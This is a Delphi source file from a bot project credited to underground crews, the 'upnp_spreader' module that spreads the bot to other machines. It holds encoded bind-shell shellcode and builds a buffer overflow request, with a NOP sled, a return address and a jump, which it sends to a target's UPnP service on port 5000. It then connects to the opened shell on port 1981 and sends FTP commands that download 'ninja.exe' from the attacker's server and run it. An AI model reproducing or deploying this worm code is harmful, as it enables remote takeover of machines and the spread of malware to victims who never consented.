(*
        Project  : unnamed -Bot
        Author   : p0ke
        Homepage : http://unnamed.bot.nu/
        Credits  : Redlime      - Helped with coding.
                   Tzorcelan    - Helped with coding and testing spread.
                   Positron     - Coded netbios-spread orginal. I Modified it.
                                - http://positronvx.cjb.net
                   Ago          - Ported alot of c++ code from him.
                   siaze        - Inject function to memory

        Shouts   : Robb, Skäggman, #swerat, #chasenet, #undergroundkonnekt
                   xcel, Codius, KOrvEn, ZiN
        Crews    : sweRAT Crew          - http://www.swerat.com
                   chaseNet Crew        - http://www.chasenet.org
                   undergroundkonnekt   - http://undergroundkonnekt.net
*)

unit upnp_spreader;

interface

uses
  Windows,
  Winsock,
  untCrypt,
  untGlobalDeclare,
  untFunctions;

Const
  phatty_rshell_upnp =
//  {
	#$EB#$10#$5A#$4A#$33#$C9#$66#$B9#$66#$01#$80#$34#$0A#$99#$E2#$FA+
	#$EB#$05#$E8#$EB#$FF#$FF#$FF+
	#$70#$99#$98#$99#$99#$C3#$21#$95#$69#$64#$E6#$12#$99#$12#$E9#$85+
	#$34#$12#$D9#$91#$12#$41#$12#$EA#$A5#$9A#$6A#$12#$EF#$E1#$9A#$6A+
	#$12#$E7#$B9#$9A#$62#$12#$D7#$8D#$AA#$74#$CF#$CE#$C8#$12#$A6#$9A+
	#$62#$12#$6B#$F3#$97#$C0#$6A#$3F#$ED#$91#$C0#$C6#$1A#$5E#$9D#$DC+
	#$7B#$70#$C0#$C6#$C7#$12#$54#$12#$DF#$BD#$9A#$5A#$48#$78#$9A#$58+
	#$AA#$50#$FF#$12#$91#$12#$DF#$85#$9A#$5A#$58#$78#$9B#$9A#$58#$12+
	#$99#$9A#$5A#$12#$63#$12#$6E#$1A#$5F#$97#$12#$49#$F3#$9A#$C0#$71+
	#$E5#$99#$99#$99#$1A#$5F#$94#$CB#$CF#$66#$CE#$65#$C3#$12#$41#$F3+
	#$9D#$C0#$71#$F0#$99#$99#$99#$C9#$C9#$C9#$C9#$F3#$98#$F3#$9B#$66+
	#$CE#$69#$12#$41#$5E#$9E#$9B#$99#$9E#$24#$AA#$59#$10#$DE#$9D#$F3+
	#$89#$CE#$CA#$66#$CE#$6D#$F3#$98#$CA#$66#$CE#$61#$C9#$C9#$CA#$66+
	#$CE#$65#$1A#$75#$DD#$12#$6D#$AA#$42#$F3#$89#$C0#$10#$85#$17#$7B+
	#$62#$10#$DF#$A1#$10#$DF#$A5#$10#$DF#$D9#$5E#$DF#$B5#$98#$98#$99+
	#$99#$14#$DE#$89#$C9#$CF#$CA#$CA#$CA#$F3#$98#$CA#$CA#$5E#$DE#$A5+
	#$FA#$F4#$FD#$99#$14#$DE#$A5#$C9#$CA#$66#$CE#$7D#$C9#$66#$CE#$71+
	#$AA#$59#$35#$1C#$59#$EC#$60#$C8#$CB#$CF#$CA#$66#$4B#$C3#$C0#$32+
	#$7B#$77#$AA#$59#$5A#$71#$62#$67#$66#$66#$DE#$FC#$ED#$C9#$EB#$F6+
	#$FA#$D8#$FD#$FD#$EB#$FC#$EA#$EA#$99#$DA#$EB#$FC#$F8#$ED#$FC#$C9+
	#$EB#$F6#$FA#$FC#$EA#$EA#$D8#$99#$DC#$E1#$F0#$ED#$C9#$EB#$F6#$FA+
	#$FC#$EA#$EA#$99#$D5#$F6#$F8#$FD#$D5#$F0#$FB#$EB#$F8#$EB#$E0#$D8+
	#$99#$EE#$EA#$AB#$C6#$AA#$AB#$99#$CE#$CA#$D8#$CA#$F6#$FA#$F2#$FC+
	#$ED#$D8#$99#$FB#$F0#$F7#$FD#$99#$F5#$F0#$EA#$ED#$FC#$F7#$99#$F8+
	#$FA#$FA#$FC#$E9#$ED#$99;
{
	#$EB#$10#$5A#$4A#$33#$C9#$66#$B9#$7D#$01#$80#$34#$0A#$99#$E2#$FA+
	#$EB#$05#$E8#$EB#$FF#$FF#$FF+
	#$70#$95#$98#$99#$99#$C3#$FD#$38#$A9#$99#$99#$99#$12#$D9#$95#$12+
	#$E9#$85#$34#$12#$D9#$91#$12#$41#$12#$EA#$A5#$12#$ED#$87#$E1#$9A+
	#$6A#$12#$E7#$B9#$9A#$62#$12#$D7#$8D#$AA#$74#$CF#$CE#$C8#$12#$A6+
	#$9A#$62#$12#$6B#$F3#$97#$C0#$6A#$3F#$ED#$91#$C0#$C6#$1A#$5E#$9D+
	#$DC#$7B#$70#$C0#$C6#$C7#$12#$54#$12#$DF#$BD#$9A#$5A#$48#$78#$9A+
	#$58#$AA#$50#$FF#$12#$91#$12#$DF#$85#$9A#$5A#$58#$78#$9B#$9A#$58+
	#$12#$99#$9A#$5A#$12#$63#$12#$6E#$1A#$5F#$97#$12#$49#$F3#$9A#$C0+
	#$71#$1E#$99#$99#$99#$1A#$5F#$94#$CB#$CF#$66#$CE#$65#$C3#$12#$41+
	#$F3#$9C#$C0#$71#$ED#$99#$99#$99#$C9#$C9#$C9#$C9#$F3#$98#$F3#$9B+
	#$66#$CE#$75#$12#$41#$5E#$9E#$9B#$99#$9D#$4B#$AA#$59#$10#$DE#$9D+
	#$F3#$89#$CE#$CA#$66#$CE#$69#$F3#$98#$CA#$66#$CE#$6D#$C9#$C9#$CA+
	#$66#$CE#$61#$12#$49#$1A#$75#$DD#$12#$6D#$AA#$59#$F3#$89#$C0#$10+
	#$9D#$17#$7B#$62#$10#$CF#$A1#$10#$CF#$A5#$10#$CF#$D9#$FF#$5E#$DF+
	#$B5#$98#$98#$14#$DE#$89#$C9#$CF#$AA#$50#$C8#$C8#$C8#$F3#$98#$C8+
	#$C8#$5E#$DE#$A5#$FA#$F4#$FD#$99#$14#$DE#$A5#$C9#$C8#$66#$CE#$79+
	#$CB#$66#$CE#$65#$CA#$66#$CE#$65#$C9#$66#$CE#$7D#$AA#$59#$35#$1C+
	#$59#$EC#$60#$C8#$CB#$CF#$CA#$66#$4B#$C3#$C0#$32#$7B#$77#$AA#$59+
	#$5A#$71#$76#$67#$66#$66#$DE#$FC#$ED#$C9#$EB#$F6#$FA#$D8#$FD#$FD+
	#$EB#$FC#$EA#$EA#$99#$DA#$EB#$FC#$F8#$ED#$FC#$C9#$EB#$F6#$FA#$FC+
	#$EA#$EA#$D8#$99#$DC#$E1#$F0#$ED#$CD#$F1#$EB#$FC#$F8#$FD#$99#$D5+
	#$F6#$F8#$FD#$D5#$F0#$FB#$EB#$F8#$EB#$E0#$D8#$99#$EE#$EA#$AB#$C6+
	#$AA#$AB#$99#$CE#$CA#$D8#$CA#$F6#$FA#$F2#$FC#$ED#$D8#$99#$FB#$F0+
	#$F7#$FD#$99#$F5#$F0#$EA#$ED#$FC#$F7#$99#$F8#$FA#$FA#$FC#$E9#$ED+
	#$99#$FA#$F5#$F6#$EA#$FC#$EA#$F6#$FA#$F2#$FC#$ED#$99;
        ^^ 309
  }

  BIND_PORT = 1981; //309;
  UPNP_PORT = 5000;

  Function DoUPNP(szHost: String; _Sock: TSocket; var lerror:string): Boolean;

implementation

uses
  untFTPD;

Function DoUPNP(szHost: String; _Sock: TSocket; var lerror:string): Boolean;
Var
  szRequest             :String; //[2048];
  szJmpCode             :Array[0..2048] Of Char; //String; //[281];
  szExeCode             :String; //[840];
  szRecvBuf             :array[0..5096] of char; //[5096];
  mkdir_buff            :String; //[400]
  szInsert              :pChar;
  I                     :Integer;

  Sock                  :TSocket;
  OutSock               :TSocket;
  Addr                  :TSockAddrIn;
  WSA                   :TWSAData;
  derr                  :integer;
Begin
  Result := FALSE;

  Try
  szInsert := #0;

//  FillChar(szRequest, 2048, #0);
  FillChar(szJmpCode, 281 , #0);
//  FillChar(szExeCode, 840 , szInsert);

  SetString(szRequest, szInsert, 2048);
//  SetString(szJmpCode, szInsert, 281);
//  SetString(szExeCode, szInsert, 840);
//  SetString(szRecvBuf, szInsert, 5096);
  SetString(mkdir_buff, szInsert, 400);

  For I := 1 To 268 Do
    szJmpCode[I] := #$90;

  szJmpCode[268] := #$4D; szJmpCode[269] := #$3F;
  szJmpCode[270] := #$E3; szJmpCode[271] := #$77;
  szJmpCode[272] := #$90; szJmpCode[273] := #$90;
  szJmpCode[274] := #$90; szJmpCode[275] := #$90;

  //jmp [ebx+0x64], jump to execute shellcode
  szJmpCode[276] := #$FF; szJmpCode[277] := #$63;
  szJmpCode[278] := #$64; szJmpCode[279] := #$90;
  szJmpCode[280] := #$00;

  SetLength(szExeCode, 32);
  For I := 1 To 32 Do
    szExeCode[I]:= #$90;

  szExeCode[32] := #$00;
//  Insert(phatty_rshell_upnp, szExeCode, Length(szExeCode));


  szExeCode := szExeCode + phatty_rshell_upnp;
  szRequest := szJmpCode + szExecode + #13#10#13#10;
//  Move(szExeCode[1], szRequest[0], Length(szExeCode));
//  szRequest := szJmpCode + szExeCode + #13#10#13#10;

  WSAStartUP($101, WSA);

  lerror := 'failed to connect';

  if _sock <= 0 then
  begin
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(UPNP_PORT);
    Addr.sin_addr.S_addr := inet_addr(pChar(szHost));
    If Connect(Sock, Addr, SizeOf(Addr)) <> 0 Then
      Exit;
  end else
    Sock := _Sock;

//    repeat
      derr := send(sock, szrequest[1], length(szrequest), 0);
//      delete(szrequest, 1, derr);
//    until (szRequest = '') or (derr <= 0);

    Sleep(3000);

    OutSock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(BIND_PORT);
    Addr.sin_addr.S_addr := inet_addr(pChar(szHost));

    If Connect(OutSock, Addr, SizeOf(Addr)) <> 0 Then
    begin
      lerror := 'failed to open shell';
      Exit;
    end;

    mkdir_buff := 'echo open ' + ftp_mainip + ' ' + IntToStr(ftp_port) + ' > bla.txt'#10+
                  'echo user ' + ftp_user + ' ' + ftp_pass + ' >> bla.txt'#10+
                  'echo binary >> bla.txt'#10+
                  'echo get ninja.exe >> bla.txt'#10+
                  'echo quit >> bla.txt'#10+
                  'ftp.exe -n -s:bla.txt'#10+
                  'ninja.exe'#10;
    If Recv(outSock, szRecvBuf[1], Length(szRecvBuf), 0) < 1 Then
      Exit;

    Sleep(500);

    If Send(outSock, mkdir_buff[1], Length(mkdir_buff), 0) < 1 Then
      Exit;

    Result := True;
    CloseSocket(outSock);
    //CloseSocket(Sock);
    Except
      Exit;
    End;
//  WSACleanUP();

End;

end.

